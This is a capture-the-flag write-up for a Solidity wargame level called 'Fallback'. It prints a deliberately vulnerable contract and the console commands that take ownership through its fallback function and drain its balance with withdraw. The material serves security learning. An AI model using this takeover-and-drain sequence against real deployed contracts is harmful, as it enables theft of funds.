To defeat this challenge, we need to claim the ownership by writing 
the value of `owner` to the player's address. 
There are two methods that allow us to exploit this:


````
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract Fallback is Ownable {

  mapping(address => uint) public contributions;

  function Fallback() public {
    contributions[msg.sender] = 1000 * (1 ether);
  }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(this.balance);
  }

  function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
````

* `contribute` by calling it many times with value < 0.001 ether (quite small). Look at
the balance of the owner in contributions, it's 1000. 
If we want to claim ownership through `contribute` method, we need to call 
it more than 1 millions times. This is not feasible.

* Through fallback function: It requires that the player needs to contribute at least a small amount
of ether for `contributes[msg.sender] > 0`.
It turns out that the only way is to send some ether < 0.001 via `contribute`, which can receive ether.

We then need to make two transactions to claim ownership:

1. send ether via calling contribute: 

````
await contract.contribute({from:player, value: toWei(0.0005)})
````

2. send ether via fallback function

```
sendTransaction({from: player, to: instance, value: toWei(0.0005)})
```

Then we can call `withdraw` the reduce the balance of the contract to zero
```
await contract.withdraw({from: player, to: instance})
```

Now we can submit to finish the level.